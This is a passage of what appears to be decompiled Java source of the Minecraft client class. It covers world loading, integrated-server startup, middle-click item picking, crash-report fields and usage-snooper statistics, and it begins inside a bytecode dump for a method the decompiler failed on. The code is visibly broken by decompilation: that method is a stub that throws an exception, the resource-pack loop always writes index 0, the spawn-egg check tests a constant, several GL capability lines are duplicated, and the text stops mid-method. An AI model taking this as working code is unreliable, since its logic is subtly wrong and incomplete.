        //  1788: getstatic       net/minecraft/client/Minecraft.rightClickDelayTimer:I
        //  1791: ifne            1807
        //  1794: getstatic       net/minecraft/client/Minecraft.thePlayer:Lnet/minecraft/client/entity/EntityPlayerSP;
        //  1797: invokevirtual   net/minecraft/client/entity/EntityPlayerSP.isUsingItem:()Z
        //  1800: ifne            1807
        //  1803: aload_0        
        //  1804: invokevirtual   net/minecraft/client/Minecraft.rightClickMouse:()V
        //  1807: aload_0        
        //  1808: aload_0        
        //  1809: getfield        net/minecraft/client/Minecraft.currentScreen:Lnet/minecraft/client/gui/GuiScreen;
        //  1812: ifnonnull       1839
        //  1815: aload_0        
        //  1816: getfield        net/minecraft/client/Minecraft.gameSettings:Lnet/minecraft/client/settings/GameSettings;
        //  1819: getfield        net/minecraft/client/settings/GameSettings.keyBindAttack:Lnet/minecraft/client/settings/KeyBinding;
        //  1822: invokevirtual   net/minecraft/client/settings/KeyBinding.getIsKeyPressed:()Z
        //  1825: ifeq            1839
        //  1828: aload_0        
        //  1829: getfield        net/minecraft/client/Minecraft.inGameHasFocus:Z
        //  1832: ifeq            1839
        //  1835: iconst_1       
        //  1836: goto            1840
        //  1839: iconst_0       
        //  1840: invokespecial   net/minecraft/client/Minecraft.sendClickBlockToController:(Z)V
        //  1843: getstatic       net/minecraft/client/Minecraft.theWorld:Lnet/minecraft/client/multiplayer/WorldClient;
        //  1846: ifnull          1982
        //  1849: getstatic       net/minecraft/client/Minecraft.thePlayer:Lnet/minecraft/client/entity/EntityPlayerSP;
        //  1852: ifnull          1888
        //  1855: aload_0        
        //  1856: dup            
        //  1857: getfield        net/minecraft/client/Minecraft.joinPlayerCounter:I
        //  1860: iconst_1       
        //  1861: iadd           
        //  1862: putfield        net/minecraft/client/Minecraft.joinPlayerCounter:I
        //  1865: aload_0        
        //  1866: getfield        net/minecraft/client/Minecraft.joinPlayerCounter:I
        //  1869: bipush          30
        //  1871: if_icmpne       1888
        //  1874: aload_0        
        //  1875: iconst_0       
        //  1876: putfield        net/minecraft/client/Minecraft.joinPlayerCounter:I
        //  1879: getstatic       net/minecraft/client/Minecraft.theWorld:Lnet/minecraft/client/multiplayer/WorldClient;
        //  1882: getstatic       net/minecraft/client/Minecraft.thePlayer:Lnet/minecraft/client/entity/EntityPlayerSP;
        //  1885: invokevirtual   net/minecraft/client/multiplayer/WorldClient.joinEntityInSurroundings:(Lnet/minecraft/entity/Entity;)V
        //  1888: aload_0        
        //  1889: getfield        net/minecraft/client/Minecraft.mcProfiler:Lnet/minecraft/profiler/Profiler;
        //  1892: ldc_w           "gameRenderer"
        //  1895: invokevirtual   net/minecraft/profiler/Profiler.endStartSection:(Ljava/lang/String;)V
        //  1898: aload_0        
        //  1899: getfield        net/minecraft/client/Minecraft.isGamePaused:Z
        //  1902: ifne            1912
        //  1905: aload_0        
        //  1906: getfield        net/minecraft/client/Minecraft.entityRenderer:Lnet/minecraft/client/renderer/EntityRenderer;
        //  1909: invokevirtual   net/minecraft/client/renderer/EntityRenderer.updateRenderer:()V
        //  1912: aload_0        
        //  1913: getfield        net/minecraft/client/Minecraft.mcProfiler:Lnet/minecraft/profiler/Profiler;
        //  1916: ldc_w           "levelRenderer"
        //  1919: invokevirtual   net/minecraft/profiler/Profiler.endStartSection:(Ljava/lang/String;)V
        //  1922: aload_0        
        //  1923: getfield        net/minecraft/client/Minecraft.isGamePaused:Z
        //  1926: ifne            1936
        //  1929: aload_0        
        //  1930: getfield        net/minecraft/client/Minecraft.renderGlobal:Lnet/minecraft/client/renderer/RenderGlobal;
        //  1933: invokevirtual   net/minecraft/client/renderer/RenderGlobal.updateClouds:()V
        //  1936: aload_0        
        //  1937: getfield        net/minecraft/client/Minecraft.mcProfiler:Lnet/minecraft/profiler/Profiler;
        //  1940: ldc_w           "level"
        //  1943: invokevirtual   net/minecraft/profiler/Profiler.endStartSection:(Ljava/lang/String;)V
        //  1946: aload_0        
        //  1947: getfield        net/minecraft/client/Minecraft.isGamePaused:Z
        //  1950: ifne            1982
        //  1953: getstatic       net/minecraft/client/Minecraft.theWorld:Lnet/minecraft/client/multiplayer/WorldClient;
        //  1956: invokevirtual   net/minecraft/client/multiplayer/WorldClient.func_175658_ac:()I
        //  1959: ifle            1976
        //  1962: getstatic       net/minecraft/client/Minecraft.theWorld:Lnet/minecraft/client/multiplayer/WorldClient;
        //  1965: getstatic       net/minecraft/client/Minecraft.theWorld:Lnet/minecraft/client/multiplayer/WorldClient;
        //  1968: invokevirtual   net/minecraft/client/multiplayer/WorldClient.func_175658_ac:()I
        //  1971: iconst_1       
        //  1972: isub           
        //  1973: invokevirtual   net/minecraft/client/multiplayer/WorldClient.setLastLightningBolt:(I)V
        //  1976: getstatic       net/minecraft/client/Minecraft.theWorld:Lnet/minecraft/client/multiplayer/WorldClient;
        //  1979: invokevirtual   net/minecraft/client/multiplayer/WorldClient.updateEntities:()V
        //  1982: aload_0        
        //  1983: getfield        net/minecraft/client/Minecraft.isGamePaused:Z
        //  1986: ifne            2002
        //  1989: aload_0        
        //  1990: getfield        net/minecraft/client/Minecraft.mcMusicTicker:Lnet/minecraft/client/audio/MusicTicker;
        //  1993: invokevirtual   net/minecraft/client/audio/MusicTicker.update:()V
        //  1996: getstatic       net/minecraft/client/Minecraft.mcSoundHandler:Lnet/minecraft/client/audio/SoundHandler;
        //  1999: invokevirtual   net/minecraft/client/audio/SoundHandler.update:()V
        //  2002: getstatic       net/minecraft/client/Minecraft.theWorld:Lnet/minecraft/client/multiplayer/WorldClient;
        //  2005: ifnull          2184
        //  2008: aload_0        
        //  2009: getfield        net/minecraft/client/Minecraft.isGamePaused:Z
        //  2012: ifne            2101
        //  2015: getstatic       net/minecraft/client/Minecraft.theWorld:Lnet/minecraft/client/multiplayer/WorldClient;
        //  2018: getstatic       net/minecraft/client/Minecraft.theWorld:Lnet/minecraft/client/multiplayer/WorldClient;
        //  2021: invokevirtual   net/minecraft/client/multiplayer/WorldClient.getDifficulty:()Lnet/minecraft/world/EnumDifficulty;
        //  2024: getstatic       net/minecraft/world/EnumDifficulty.PEACEFUL:Lnet/minecraft/world/EnumDifficulty;
        //  2027: if_acmpeq       2034
        //  2030: iconst_1       
        //  2031: goto            2035
        //  2034: iconst_0       
        //  2035: iconst_1       
        //  2036: invokevirtual   net/minecraft/client/multiplayer/WorldClient.setAllowedSpawnTypes:(ZZ)V
        //  2039: getstatic       net/minecraft/client/Minecraft.theWorld:Lnet/minecraft/client/multiplayer/WorldClient;
        //  2042: invokevirtual   net/minecraft/client/multiplayer/WorldClient.tick:()V
        //  2045: goto            2101
        //  2048: astore_3       
        //  2049: aload_3        
        //  2050: ldc_w           "Exception in world tick"
        //  2053: invokestatic    net/minecraft/crash/CrashReport.makeCrashReport:(Ljava/lang/Throwable;Ljava/lang/String;)Lnet/minecraft/crash/CrashReport;
        //  2056: astore_1       
        //  2057: getstatic       net/minecraft/client/Minecraft.theWorld:Lnet/minecraft/client/multiplayer/WorldClient;
        //  2060: ifnonnull       2084
        //  2063: aload_1        
        //  2064: ldc_w           "Affected level"
        //  2067: invokevirtual   net/minecraft/crash/CrashReport.makeCategory:(Ljava/lang/String;)Lnet/minecraft/crash/CrashReportCategory;
        //  2070: astore_2       
        //  2071: aload_2        
        //  2072: ldc_w           "Problem"
        //  2075: ldc_w           "Level is null!"
        //  2078: invokevirtual   net/minecraft/crash/CrashReportCategory.addCrashSection:(Ljava/lang/String;Ljava/lang/Object;)V
        //  2081: goto            2092
        //  2084: getstatic       net/minecraft/client/Minecraft.theWorld:Lnet/minecraft/client/multiplayer/WorldClient;
        //  2087: aload_1        
        //  2088: invokevirtual   net/minecraft/client/multiplayer/WorldClient.addWorldInfoToCrashReport:(Lnet/minecraft/crash/CrashReport;)Lnet/minecraft/crash/CrashReportCategory;
        //  2091: pop            
        //  2092: new             Lnet/minecraft/util/ReportedException;
        //  2095: dup            
        //  2096: aload_1        
        //  2097: invokespecial   net/minecraft/util/ReportedException.<init>:(Lnet/minecraft/crash/CrashReport;)V
        //  2100: athrow         
        //  2101: aload_0        
        //  2102: getfield        net/minecraft/client/Minecraft.mcProfiler:Lnet/minecraft/profiler/Profiler;
        //  2105: ldc_w           "animateTick"
        //  2108: invokevirtual   net/minecraft/profiler/Profiler.endStartSection:(Ljava/lang/String;)V
        //  2111: aload_0        
        //  2112: getfield        net/minecraft/client/Minecraft.isGamePaused:Z
        //  2115: ifne            2157
        //  2118: getstatic       net/minecraft/client/Minecraft.theWorld:Lnet/minecraft/client/multiplayer/WorldClient;
        //  2121: ifnull          2157
        //  2124: getstatic       net/minecraft/client/Minecraft.theWorld:Lnet/minecraft/client/multiplayer/WorldClient;
        //  2127: getstatic       net/minecraft/client/Minecraft.thePlayer:Lnet/minecraft/client/entity/EntityPlayerSP;
        //  2130: getfield        net/minecraft/client/entity/EntityPlayerSP.posX:D
        //  2133: invokestatic    net/minecraft/util/MathHelper.floor_double:(D)I
        //  2136: getstatic       net/minecraft/client/Minecraft.thePlayer:Lnet/minecraft/client/entity/EntityPlayerSP;
        //  2139: getfield        net/minecraft/client/entity/EntityPlayerSP.posY:D
        //  2142: invokestatic    net/minecraft/util/MathHelper.floor_double:(D)I
        //  2145: getstatic       net/minecraft/client/Minecraft.thePlayer:Lnet/minecraft/client/entity/EntityPlayerSP;
        //  2148: getfield        net/minecraft/client/entity/EntityPlayerSP.posZ:D
        //  2151: invokestatic    net/minecraft/util/MathHelper.floor_double:(D)I
        //  2154: invokevirtual   net/minecraft/client/multiplayer/WorldClient.doVoidFogParticles:(III)V
        //  2157: aload_0        
        //  2158: getfield        net/minecraft/client/Minecraft.mcProfiler:Lnet/minecraft/profiler/Profiler;
        //  2161: ldc_w           "particles"
        //  2164: invokevirtual   net/minecraft/profiler/Profiler.endStartSection:(Ljava/lang/String;)V
        //  2167: aload_0        
        //  2168: getfield        net/minecraft/client/Minecraft.isGamePaused:Z
        //  2171: ifne            2208
        //  2174: aload_0        
        //  2175: getfield        net/minecraft/client/Minecraft.effectRenderer:Lnet/minecraft/client/particle/EffectRenderer;
        //  2178: invokevirtual   net/minecraft/client/particle/EffectRenderer.updateEffects:()V
        //  2181: goto            2208
        //  2184: aload_0        
        //  2185: getfield        net/minecraft/client/Minecraft.myNetworkManager:Lnet/minecraft/network/NetworkManager;
        //  2188: ifnull          2208
        //  2191: aload_0        
        //  2192: getfield        net/minecraft/client/Minecraft.mcProfiler:Lnet/minecraft/profiler/Profiler;
        //  2195: ldc_w           "pendingConnection"
        //  2198: invokevirtual   net/minecraft/profiler/Profiler.endStartSection:(Ljava/lang/String;)V
        //  2201: aload_0        
        //  2202: getfield        net/minecraft/client/Minecraft.myNetworkManager:Lnet/minecraft/network/NetworkManager;
        //  2205: invokevirtual   net/minecraft/network/NetworkManager.processReceivedPackets:()V
        //  2208: aload_0        
        //  2209: getfield        net/minecraft/client/Minecraft.mcProfiler:Lnet/minecraft/profiler/Profiler;
        //  2212: invokevirtual   net/minecraft/profiler/Profiler.endSection:()V
        //  2215: aload_0        
        //  2216: invokestatic    net/minecraft/client/Minecraft.getSystemTime:()J
        //  2219: putfield        net/minecraft/client/Minecraft.systemTime:J
        //  2222: return         
        //    Exceptions:
        //  throws java.io.IOException
        // 
        // The error that occurred was:
        // 
        // java.lang.IllegalStateException: Inconsistent stack size at #0946 (coming from #0943).
        //     at com.strobel.decompiler.ast.AstBuilder.performStackAnalysis(AstBuilder.java:2183)
        //     at com.strobel.decompiler.ast.AstBuilder.build(AstBuilder.java:108)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.createMethodBody(AstMethodBodyBuilder.java:211)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.createMethodBody(AstMethodBodyBuilder.java:99)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.createMethodBody(AstBuilder.java:782)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.createMethod(AstBuilder.java:675)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.addTypeMembers(AstBuilder.java:552)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.createTypeCore(AstBuilder.java:519)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.createTypeNoCache(AstBuilder.java:161)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.createType(AstBuilder.java:150)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.addType(AstBuilder.java:125)
        //     at com.strobel.decompiler.languages.java.JavaLanguage.buildAst(JavaLanguage.java:71)
        //     at com.strobel.decompiler.languages.java.JavaLanguage.decompileType(JavaLanguage.java:59)
        //     at us.deathmarine.luyten.FileSaver.doSaveJarDecompiled(FileSaver.java:192)
        //     at us.deathmarine.luyten.FileSaver.access$300(FileSaver.java:45)
        //     at us.deathmarine.luyten.FileSaver$4.run(FileSaver.java:112)
        //     at java.lang.Thread.run(Unknown Source)
        // 
        throw new IllegalStateException("An error occurred while decompiling this method.");
    }
    
    public void launchIntegratedServer(final String s, final String s2, WorldSettings worldSettings) {
        this.loadWorld(null);
        System.gc();
        final ISaveHandler saveLoader = this.saveLoader.getSaveLoader(s, false);
        WorldInfo loadWorldInfo = saveLoader.loadWorldInfo();
        if (loadWorldInfo == null && worldSettings != null) {
            loadWorldInfo = new WorldInfo(worldSettings, s);
            saveLoader.saveWorldInfo(loadWorldInfo);
        }
        if (worldSettings == null) {
            worldSettings = new WorldSettings(loadWorldInfo);
        }
        (this.theIntegratedServer = new IntegratedServer(this, s, s2, worldSettings)).startServerThread();
        this.integratedServerIsRunning = true;
        this.loadingScreen.displaySavingString(I18n.format("menu.loadingLevel", new Object[0]));
        while (!this.theIntegratedServer.serverIsInRunLoop()) {
            final String userMessage = this.theIntegratedServer.getUserMessage();
            if (userMessage != null) {
                this.loadingScreen.displayLoadingString(I18n.format(userMessage, new Object[0]));
            }
            else {
                this.loadingScreen.displayLoadingString("");
            }
            Thread.sleep(200L);
        }
        this.displayGuiScreen(null);
        final SocketAddress addLocalEndpoint = this.theIntegratedServer.getNetworkSystem().addLocalEndpoint();
        final NetworkManager provideLocalClient = NetworkManager.provideLocalClient(addLocalEndpoint);
        provideLocalClient.setNetHandler(new NetHandlerLoginClient(provideLocalClient, this, null));
        provideLocalClient.sendPacket(new C00Handshake(47, addLocalEndpoint.toString(), 0, EnumConnectionState.LOGIN));
        provideLocalClient.sendPacket(new C00PacketLoginStart(getSession().getProfile()));
        this.myNetworkManager = provideLocalClient;
    }
    
    public void loadWorld(final WorldClient worldClient) {
        this.loadWorld(worldClient, "");
    }
    
    public void loadWorld(final WorldClient worldClient, final String s) {
        if (worldClient == null) {
            final NetHandlerPlayClient netHandler = this.getNetHandler();
            if (netHandler != null) {
                netHandler.cleanup();
            }
            if (this.theIntegratedServer != null && this.theIntegratedServer.func_175578_N()) {
                this.theIntegratedServer.initiateShutdown();
                this.theIntegratedServer.func_175592_a();
            }
            this.theIntegratedServer = null;
            this.guiAchievement.clearAchievements();
            this.entityRenderer.getMapItemRenderer().func_148249_a();
        }
        this.field_175622_Z = null;
        this.myNetworkManager = null;
        if (this.loadingScreen != null) {
            this.loadingScreen.resetProgressAndMessage(s);
            this.loadingScreen.displayLoadingString("");
        }
        if (worldClient == null && Minecraft.theWorld != null) {
            if (this.mcResourcePackRepository.getResourcePackInstance() != null) {
                this.mcResourcePackRepository.func_148529_f();
                this.func_175603_A();
            }
            this.setServerData(null);
            this.integratedServerIsRunning = false;
        }
        Minecraft.mcSoundHandler.stopSounds();
        if ((Minecraft.theWorld = worldClient) != null) {
            if (this.renderGlobal != null) {
                this.renderGlobal.setWorldAndLoadRenderers(worldClient);
            }
            if (this.effectRenderer != null) {
                this.effectRenderer.clearEffects(worldClient);
            }
            if (Minecraft.thePlayer == null) {
                Minecraft.thePlayer = Minecraft.playerController.func_178892_a(worldClient, new StatFileWriter());
                Minecraft.playerController.flipPlayer(Minecraft.thePlayer);
            }
            Minecraft.thePlayer.preparePlayerToSpawn();
            worldClient.spawnEntityInWorld(Minecraft.thePlayer);
            Minecraft.thePlayer.movementInput = new MovementInputFromOptions(this.gameSettings);
            Minecraft.playerController.setPlayerCapabilities(Minecraft.thePlayer);
            this.field_175622_Z = Minecraft.thePlayer;
        }
        else {
            this.saveLoader.flushCache();
            Minecraft.thePlayer = null;
        }
        System.gc();
        this.systemTime = 0L;
    }
    
    public void setDimensionAndSpawnPlayer(final int dimension) {
        Minecraft.theWorld.setInitialSpawnLocation();
        Minecraft.theWorld.removeAllEntities();
        String clientBrand = null;
        if (Minecraft.thePlayer != null) {
            Minecraft.thePlayer.getEntityId();
            Minecraft.theWorld.removeEntity(Minecraft.thePlayer);
            clientBrand = Minecraft.thePlayer.getClientBrand();
        }
        this.field_175622_Z = null;
        final EntityPlayerSP thePlayer = Minecraft.thePlayer;
        Minecraft.thePlayer = Minecraft.playerController.func_178892_a(Minecraft.theWorld, (Minecraft.thePlayer == null) ? new StatFileWriter() : Minecraft.thePlayer.getStatFileWriter());
        Minecraft.thePlayer.getDataWatcher().updateWatchedObjectsFromList(thePlayer.getDataWatcher().getAllWatched());
        Minecraft.thePlayer.dimension = dimension;
        this.field_175622_Z = Minecraft.thePlayer;
        Minecraft.thePlayer.preparePlayerToSpawn();
        Minecraft.thePlayer.func_175158_f(clientBrand);
        Minecraft.theWorld.spawnEntityInWorld(Minecraft.thePlayer);
        Minecraft.playerController.flipPlayer(Minecraft.thePlayer);
        Minecraft.thePlayer.movementInput = new MovementInputFromOptions(this.gameSettings);
        Minecraft.thePlayer.setEntityId(0);
        Minecraft.playerController.setPlayerCapabilities(Minecraft.thePlayer);
        Minecraft.thePlayer.func_175150_k(thePlayer.func_175140_cp());
        if (this.currentScreen instanceof GuiGameOver) {
            this.displayGuiScreen(null);
        }
    }
    
    public final boolean isDemo() {
        return this.isDemo;
    }
    
    public NetHandlerPlayClient getNetHandler() {
        return (Minecraft.thePlayer != null) ? Minecraft.thePlayer.sendQueue : null;
    }
    
    public static boolean isGuiEnabled() {
        return Minecraft.theMinecraft == null || !Minecraft.theMinecraft.gameSettings.hideGUI;
    }
    
    public static boolean isFancyGraphicsEnabled() {
        return Minecraft.theMinecraft != null && Minecraft.theMinecraft.gameSettings.fancyGraphics;
    }
    
    public static boolean isAmbientOcclusionEnabled() {
        return Minecraft.theMinecraft != null && Minecraft.theMinecraft.gameSettings.ambientOcclusion != 0;
    }
    
    private void middleClickMouse() {
        if (this.objectMouseOver != null) {
            final boolean isCreativeMode = Minecraft.thePlayer.capabilities.isCreativeMode;
            TileEntity tileEntity = null;
            Item item;
            if (this.objectMouseOver.typeOfHit == MovingObjectPosition.MovingObjectType.BLOCK) {
                final BlockPos func_178782_a = this.objectMouseOver.func_178782_a();
                final Block block = Minecraft.theWorld.getBlockState(func_178782_a).getBlock();
                if (block.getMaterial() == Material.air) {
                    return;
                }
                item = block.getItem(Minecraft.theWorld, func_178782_a);
                if (item == null) {
                    return;
                }
                if (isCreativeMode && GuiScreen.isCtrlKeyDown()) {
                    tileEntity = Minecraft.theWorld.getTileEntity(func_178782_a);
                }
                ((item instanceof ItemBlock && !block.isFlowerPot()) ? Block.getBlockFromItem(item) : block).getDamageValue(Minecraft.theWorld, func_178782_a);
                item.getHasSubtypes();
            }
            else {
                if (this.objectMouseOver.typeOfHit != MovingObjectPosition.MovingObjectType.ENTITY || this.objectMouseOver.entityHit == null || !isCreativeMode) {
                    return;
                }
                if (this.objectMouseOver.entityHit instanceof EntityPainting) {
                    item = Items.painting;
                }
                else if (this.objectMouseOver.entityHit instanceof EntityLeashKnot) {
                    item = Items.lead;
                }
                else if (this.objectMouseOver.entityHit instanceof EntityItemFrame) {
                    final ItemStack displayedItem = ((EntityItemFrame)this.objectMouseOver.entityHit).getDisplayedItem();
                    if (displayedItem == null) {
                        item = Items.item_frame;
                    }
                    else {
                        item = displayedItem.getItem();
                        displayedItem.getMetadata();
                    }
                }
                else if (this.objectMouseOver.entityHit instanceof EntityMinecart) {
                    switch (SwitchEnumMinecartType.field_178901_b[((EntityMinecart)this.objectMouseOver.entityHit).func_180456_s().ordinal()]) {
                        case 1: {
                            item = Items.furnace_minecart;
                            break;
                        }
                        case 2: {
                            item = Items.chest_minecart;
                            break;
                        }
                        case 3: {
                            item = Items.tnt_minecart;
                            break;
                        }
                        case 4: {
                            item = Items.hopper_minecart;
                            break;
                        }
                        case 5: {
                            item = Items.command_block_minecart;
                            break;
                        }
                        default: {
                            item = Items.minecart;
                            break;
                        }
                    }
                }
                else if (this.objectMouseOver.entityHit instanceof EntityBoat) {
                    item = Items.boat;
                }
                else if (this.objectMouseOver.entityHit instanceof EntityArmorStand) {
                    item = Items.armor_stand;
                }
                else {
                    item = Items.spawn_egg;
                    EntityList.getEntityID(this.objectMouseOver.entityHit);
                    if (!EntityList.entityEggs.containsKey(0)) {
                        return;
                    }
                }
            }
            final InventoryPlayer inventory = Minecraft.thePlayer.inventory;
            if (tileEntity == null) {
                inventory.setCurrentItem(item, 0, true, isCreativeMode);
            }
            else {
                final NBTTagCompound nbtTagCompound = new NBTTagCompound();
                tileEntity.writeToNBT(nbtTagCompound);
                final ItemStack itemStack = new ItemStack(item, 1, 0);
                itemStack.setTagInfo("BlockEntityTag", nbtTagCompound);
                final NBTTagCompound nbtTagCompound2 = new NBTTagCompound();
                final NBTTagList list = new NBTTagList();
                list.appendTag(new NBTTagString("(+NBT)"));
                nbtTagCompound2.setTag("Lore", list);
                itemStack.setTagInfo("display", nbtTagCompound2);
                inventory.setInventorySlotContents(inventory.currentItem, itemStack);
            }
            if (isCreativeMode) {
                Minecraft.playerController.sendSlotPacket(inventory.getStackInSlot(inventory.currentItem), Minecraft.thePlayer.inventoryContainer.inventorySlots.size() - 9 + inventory.currentItem);
            }
        }
    }
    
    public CrashReport addGraphicsAndWorldToCrashReport(final CrashReport crashReport) {
        crashReport.getCategory().addCrashSectionCallable("Launched Version", new Callable() {
            private static final String __OBFID;
            final Minecraft this$0;
            
            @Override
            public String call() {
                return Minecraft.access$0(this.this$0);
            }
            
            public Object call1() {
                return this.call();
            }
            
            @Override
            public Object call() throws Exception {
                return this.call();
            }
            
            static {
                __OBFID = "CL_00000643";
            }
        });
        crashReport.getCategory().addCrashSectionCallable("LWJGL", new Callable() {
            private static final String __OBFID;
            final Minecraft this$0;
            
            @Override
            public String call() {
                return Sys.getVersion();
            }
            
            public Object call1() {
                return this.call();
            }
            
            @Override
            public Object call() throws Exception {
                return this.call();
            }
            
            static {
                __OBFID = "CL_00000644";
            }
        });
        crashReport.getCategory().addCrashSectionCallable("OpenGL", new Callable() {
            private static final String __OBFID;
            final Minecraft this$0;
            
            @Override
            public String call() {
                return String.valueOf(GL11.glGetString(7937)) + " GL version " + GL11.glGetString(7938) + ", " + GL11.glGetString(7936);
            }
            
            public Object call1() {
                return this.call();
            }
            
            @Override
            public Object call() throws Exception {
                return this.call();
            }
            
            static {
                __OBFID = "CL_00000645";
            }
        });
        crashReport.getCategory().addCrashSectionCallable("GL Caps", new Callable() {
            private static final String __OBFID;
            final Minecraft this$0;
            
            @Override
            public String call() {
                return OpenGlHelper.func_153172_c();
            }
            
            public Object call1() {
                return this.call();
            }
            
            @Override
            public Object call() throws Exception {
                return this.call();
            }
            
            static {
                __OBFID = "CL_00000646";
            }
        });
        crashReport.getCategory().addCrashSectionCallable("Using VBOs", new Callable() {
            private static final String __OBFID;
            final Minecraft this$0;
            
            @Override
            public String call() {
                return this.this$0.gameSettings.field_178881_t ? "Yes" : "No";
            }
            
            public Object call1() {
                return this.call();
            }
            
            @Override
            public Object call() throws Exception {
                return this.call();
            }
            
            static {
                __OBFID = "CL_00000647";
            }
        });
        crashReport.getCategory().addCrashSectionCallable("Is Modded", new Callable() {
            private static final String __OBFID;
            final Minecraft this$0;
            
            @Override
            public String call() {
                final String clientModName = ClientBrandRetriever.getClientModName();
                return clientModName.equals("vanilla") ? ((Minecraft.class.getSigners() == null) ? "Very likely; Jar signature invalidated" : "Probably not. Jar signature remains and client brand is untouched.") : ("Definitely; Client brand changed to '" + clientModName + "'");
            }
            
            public Object call1() {
                return this.call();
            }
            
            @Override
            public Object call() throws Exception {
                return this.call();
            }
            
            static {
                __OBFID = "CL_00000633";
            }
        });
        crashReport.getCategory().addCrashSectionCallable("Type", new Callable() {
            private static final String __OBFID;
            final Minecraft this$0;
            
            @Override
            public String call() {
                return "Client (map_client.txt)";
            }
            
            public Object call1() {
                return this.call();
            }
            
            @Override
            public Object call() throws Exception {
                return this.call();
            }
            
            static {
                __OBFID = "CL_00000634";
            }
        });
        crashReport.getCategory().addCrashSectionCallable("Resource Packs", new Callable() {
            private static final String __OBFID;
            final Minecraft this$0;
            
            @Override
            public String call() {
                return this.this$0.gameSettings.resourcePacks.toString();
            }
            
            public Object call1() {
                return this.call();
            }
            
            @Override
            public Object call() throws Exception {
                return this.call();
            }
            
            static {
                __OBFID = "CL_00000635";
            }
        });
        crashReport.getCategory().addCrashSectionCallable("Current Language", new Callable() {
            private static final String __OBFID;
            final Minecraft this$0;
            
            @Override
            public String call() {
                return this.this$0.mcLanguageManager.getCurrentLanguage().toString();
            }
            
            public Object call1() {
                return this.call();
            }
            
            @Override
            public Object call() throws Exception {
                return this.call();
            }
            
            static {
                __OBFID = "CL_00000636";
            }
        });
        crashReport.getCategory().addCrashSectionCallable("Profiler Position", new Callable() {
            private static final String __OBFID;
            final Minecraft this$0;
            
            public String call1() {
                return this.this$0.mcProfiler.profilingEnabled ? this.this$0.mcProfiler.getNameOfLastSection() : "N/A (disabled)";
            }
            
            @Override
            public Object call() {
                return this.call1();
            }
            
            static {
                __OBFID = "CL_00000637";
            }
        });
        if (Minecraft.theWorld != null) {
            Minecraft.theWorld.addWorldInfoToCrashReport(crashReport);
        }
        return crashReport;
    }
    
    public static Minecraft getMinecraft() {
        return Minecraft.theMinecraft;
    }
    
    public ListenableFuture func_175603_A() {
        return this.addScheduledTask(new Runnable() {
            private static final String __OBFID;
            final Minecraft this$0;
            
            @Override
            public void run() {
                this.this$0.refreshResources();
            }
            
            static {
                __OBFID = "CL_00001853";
            }
        });
    }
    
    @Override
    public void addServerStatsToSnooper(final PlayerUsageSnooper playerUsageSnooper) {
        playerUsageSnooper.addClientStat("fps", Minecraft.debugFPS);
        playerUsageSnooper.addClientStat("vsync_enabled", this.gameSettings.enableVsync);
        playerUsageSnooper.addClientStat("display_frequency", Display.getDisplayMode().getFrequency());
        playerUsageSnooper.addClientStat("display_type", this.fullscreen ? "fullscreen" : "windowed");
        playerUsageSnooper.addClientStat("run_time", (MinecraftServer.getCurrentTimeMillis() - playerUsageSnooper.getMinecraftStartTimeMillis()) / 60L * 1000L);
        playerUsageSnooper.addClientStat("endianness", (ByteOrder.nativeOrder() == ByteOrder.LITTLE_ENDIAN) ? "little" : "big");
        playerUsageSnooper.addClientStat("resource_packs", this.mcResourcePackRepository.getRepositoryEntries().size());
        for (final ResourcePackRepository.Entry entry : this.mcResourcePackRepository.getRepositoryEntries()) {
            final StringBuilder sb = new StringBuilder("resource_pack[");
            final int n = 0;
            int n2 = 0;
            ++n2;
            playerUsageSnooper.addClientStat(sb.append(n).append("]").toString(), entry.getResourcePackName());
        }
        if (this.theIntegratedServer != null && this.theIntegratedServer.getPlayerUsageSnooper() != null) {
            playerUsageSnooper.addClientStat("snooper_partner", this.theIntegratedServer.getPlayerUsageSnooper().getUniqueID());
        }
    }
    
    @Override
    public void addServerTypeToSnooper(final PlayerUsageSnooper playerUsageSnooper) {
        playerUsageSnooper.addStatToSnooper("opengl_version", GL11.glGetString(7938));
        playerUsageSnooper.addStatToSnooper("opengl_vendor", GL11.glGetString(7936));
        playerUsageSnooper.addStatToSnooper("client_brand", ClientBrandRetriever.getClientModName());
        playerUsageSnooper.addStatToSnooper("launched_version", this.launchedVersion);
        final ContextCapabilities capabilities = GLContext.getCapabilities();
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_arrays_of_arrays]", capabilities.GL_ARB_arrays_of_arrays);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_base_instance]", capabilities.GL_ARB_base_instance);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_blend_func_extended]", capabilities.GL_ARB_blend_func_extended);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_clear_buffer_object]", capabilities.GL_ARB_clear_buffer_object);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_color_buffer_float]", capabilities.GL_ARB_color_buffer_float);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_compatibility]", capabilities.GL_ARB_compatibility);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_compressed_texture_pixel_storage]", capabilities.GL_ARB_compressed_texture_pixel_storage);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_compute_shader]", capabilities.GL_ARB_compute_shader);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_copy_buffer]", capabilities.GL_ARB_copy_buffer);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_copy_image]", capabilities.GL_ARB_copy_image);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_depth_buffer_float]", capabilities.GL_ARB_depth_buffer_float);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_compute_shader]", capabilities.GL_ARB_compute_shader);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_copy_buffer]", capabilities.GL_ARB_copy_buffer);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_copy_image]", capabilities.GL_ARB_copy_image);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_depth_buffer_float]", capabilities.GL_ARB_depth_buffer_float);
